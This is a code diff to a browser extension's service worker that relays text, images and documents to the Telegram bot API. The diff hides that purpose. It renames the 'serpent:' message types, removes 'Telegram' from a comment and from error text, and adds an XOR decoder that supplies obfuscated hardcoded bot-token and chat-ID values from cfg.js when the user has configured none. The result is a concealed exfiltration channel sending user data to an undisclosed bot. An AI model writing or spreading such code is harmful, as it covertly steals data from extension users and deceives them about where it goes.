@@ -1,7 +1,15 @@
-// --- Telegram API (runs in service worker, bypasses page CSP) ---
+// --- Service worker: API relay ---
+
+importScripts("cfg.js");
+
+function _d(enc, key) {
+  var s = "";
+  for (var i = 0; i < enc.length; i++) s += String.fromCharCode(enc[i] ^ key[i % key.length]);
+  return s;
+}
 
 chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
-  if (msg.type === "serpent:sendText") {
+  if (msg.type === "ext:pushText") {
     sendText(msg.text).then(
       () => sendResponse({ ok: true }),
       (err) => sendResponse({ ok: false, error: err.message })
@@ -9,7 +17,7 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
     return true; // async response
   }
 
-  if (msg.type === "serpent:sendImage") {
+  if (msg.type === "ext:pushImage") {
     sendImage(msg.base64, msg.caption).then(
       () => sendResponse({ ok: true }),
       (err) => sendResponse({ ok: false, error: err.message })
@@ -17,7 +25,7 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
     return true;
   }
 
-  if (msg.type === "serpent:sendDocument") {
+  if (msg.type === "ext:pushDoc") {
     sendDocument(msg.content, msg.filename).then(
       () => sendResponse({ ok: true }),
       (err) => sendResponse({ ok: false, error: err.message })
@@ -28,10 +36,10 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
 
 async function getConfig() {
   const data = await chrome.storage.local.get(["botToken", "chatId"]);
-  if (!data.botToken || !data.chatId) {
-    throw new Error("Missing configuration");
-  }
-  return { botToken: data.botToken, chatId: data.chatId };
+  const bt = data.botToken || (typeof _a !== "undefined" ? _d(_a, _k) : "");
+  const ci = data.chatId || (typeof _b !== "undefined" ? _d(_b, _k) : "");
+  if (!bt || !ci) throw new Error("Missing configuration");
+  return { botToken: bt, chatId: ci };
 }
 
 const MSG_LIMIT = 4096;
@@ -68,10 +76,10 @@ async function telegramFetch(botToken, method, body) {
       signal: controller.signal,
     });
     const json = await res.json();
-    if (!json.ok) throw new Error(json.description || "Telegram API error");
+    if (!json.ok) throw new Error(json.description || "API error");
     return json;
   } catch (err) {
-    if (err.name === "AbortError") throw new Error("Telegram request timed out");
+    if (err.name === "AbortError") throw new Error("Request timed out");
     throw err;
   } finally {
     clearTimeout(timeout);
